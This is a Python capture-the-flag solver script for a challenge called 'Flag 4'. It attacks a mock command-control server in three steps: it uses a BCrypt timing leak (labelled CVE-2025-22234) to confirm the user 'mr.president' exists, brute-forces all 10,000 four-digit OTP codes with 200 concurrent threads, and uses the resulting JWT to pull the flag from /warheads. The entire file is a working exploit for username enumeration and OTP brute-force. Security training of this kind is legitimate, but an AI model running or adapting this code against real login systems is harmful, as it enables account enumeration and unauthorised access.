#!/usr/bin/env python3
"""Flag 4 — CVE-2025-22234 timing leak + concurrent OTP brute-force.

  1. Confirm "mr.president" exists by sending a 73-byte password to /login —
     existing users go through BCrypt (~250ms), absent ones fail fast (~2ms).
  2. Brute-force the 4-digit OTP at /verify-otp inside a single 30-second
     window. With 200 worker threads we cover 0000-9999 well within the
     window even on a modest box.
  3. The first 200 response carries a JWT; use it to GET /warheads and pull
     Flag 4.
"""

from __future__ import annotations

import json
import statistics
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

from common import DEFAULT_COMMAND, banner, bearer, detail, die, dump, find_flag, section


WRONG_PASSWORD = "definitely-not-the-right-password"
TARGET_USERNAME = "mr.president"
DECOY_USERNAME = "definitely-not-a-user"


def _time_login(command_url: str, username: str) -> float:
    t0 = time.perf_counter()
    requests.post(
        f"{command_url}/login",
        json={"username": username, "password": WRONG_PASSWORD},
        timeout=10,
    )
    return (time.perf_counter() - t0) * 1000.0


def confirm_user_exists(command_url: str, username: str, samples: int = 7) -> bool:
    section("flag4", "STEP 1 — timing-attack to confirm user exists")
    detail("flag4", "CVE", "CVE-2025-22234 (Spring Security username-enum via BCrypt timing)")
    detail("flag4", "target", username)
    detail("flag4", "decoy", DECOY_USERNAME)
    detail("flag4", "wrong password", f"{WRONG_PASSWORD!r} ({len(WRONG_PASSWORD)} bytes)")
    detail("flag4", "expected", "present user → BCrypt runs (~250ms); missing user → fast fail (~2ms)")

    banner("flag4", "  → warming up (2 rounds, results discarded)")
    for _ in range(2):
        _time_login(command_url, username)
        _time_login(command_url, DECOY_USERNAME)

    banner("flag4", f"  → measuring {samples} samples each (interleaved)")
    present = []
    absent = []
    for i in range(samples):
        p = _time_login(command_url, username)
        a = _time_login(command_url, DECOY_USERNAME)
        present.append(p)
        absent.append(a)
        detail("flag4", f"    sample {i+1}", f"present={p:7.1f}ms  absent={a:7.1f}ms  Δ={p-a:+.1f}ms")

    med_p = statistics.median(present)
    med_a = statistics.median(absent)
    gap = med_p - med_a
    banner("flag4", f"  median present={med_p:.1f}ms  absent={med_a:.1f}ms  gap={gap:.1f}ms")
    detail("flag4", "decision threshold", "gap > 50ms ⇒ user exists")
    if gap > 50.0:
        banner("flag4", "  ✓ user confirmed present (BCrypt path was triggered)")
        return True
    banner("flag4", "  ✗ no significant timing gap — user likely absent")
    return False


def _try_otp(command_url: str, code: str) -> str | None:
    r = requests.post(
        f"{command_url}/verify-otp",
        json={"username": TARGET_USERNAME, "otp": code},
        timeout=10,
    )
    if r.status_code == 200:
        return r.json().get("token")
    return None


def bruteforce_otp(command_url: str, workers: int = 200) -> str:
    section("flag4", "STEP 2 — brute-force the 4-digit OTP")
    detail("flag4", "search space", "0000–9999 (10,000 codes)")
    detail("flag4", "validity window", "~30 seconds")
    detail("flag4", "concurrency", f"{workers} threads")
    detail("flag4", "endpoint", f"{command_url}/verify-otp")
    detail("flag4", "username", TARGET_USERNAME)

    banner("flag4", "  → submitting all 10,000 codes via thread pool")
    started = time.perf_counter()
    completed = 0
    progress_step = 1000
    next_progress = progress_step

    with ThreadPoolExecutor(max_workers=workers) as pool:
        futures = {pool.submit(_try_otp, command_url, f"{i:04d}"): i for i in range(10000)}
        for fut in as_completed(futures):
            completed += 1
            if completed >= next_progress:
                elapsed = time.perf_counter() - started
                detail("flag4", "  progress", f"{completed}/10000 in {elapsed:.1f}s")
                next_progress += progress_step

            token = fut.result()
            if token:
                elapsed = time.perf_counter() - started
                banner("flag4", f"  ✓ HIT OTP {futures[fut]:04d} after {completed} attempts in {elapsed:.1f}s")
                detail("flag4", "  jwt (first 40 chars)", f"{token[:40]}…")
                dump("flag4", "full JWT", token)
                # Cancel the remaining tasks — we already have what we need.
                for f in futures:
                    f.cancel()
                return token
    die("OTP brute-force exhausted without a hit (window likely rolled)")


def run(command_url: str | None = None) -> str:
    if command_url is None:
        command_url = DEFAULT_COMMAND
    banner("flag4", f"target command-control = {command_url}")

    if not confirm_user_exists(command_url, TARGET_USERNAME):
        die("timing leak did not confirm mr.president — check Spring Security version")

    token = bruteforce_otp(command_url)

    section("flag4", "STEP 3 — use JWT to fetch /warheads")
    url = f"{command_url}/warheads"
    detail("flag4", "GET URL", url)
    detail("flag4", "auth scheme", "Bearer JWT")
    detail("flag4", "token (truncated)", f"{token[:40]}…")

    r = requests.get(url, headers=bearer(token), timeout=10)
    detail("flag4", "response status", r.status_code)
    detail("flag4", "response length", f"{len(r.text)} bytes")
    if r.status_code != 200:
        die(f"/warheads rejected the JWT: {r.status_code} {r.text}")

    flag = find_flag(r.text) or r.json().get("flag")
    if not flag:
        die("/warheads returned 200 but no flag")
    detail("flag4", "warheads body preview", r.text[:200].replace("\n", " ⏎ "))
    try:
        dump("flag4", "full /warheads response", r.json())
    except ValueError:
        dump("flag4", "full /warheads response", r.text)
    banner("flag4", f"FLAG 4 = {flag}")
    return flag


def main() -> None:
    command_url = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND
    flag = run(command_url)
    print()
    print(json.dumps({"flag4": flag}, indent=2))


if __name__ == "__main__":
    main()
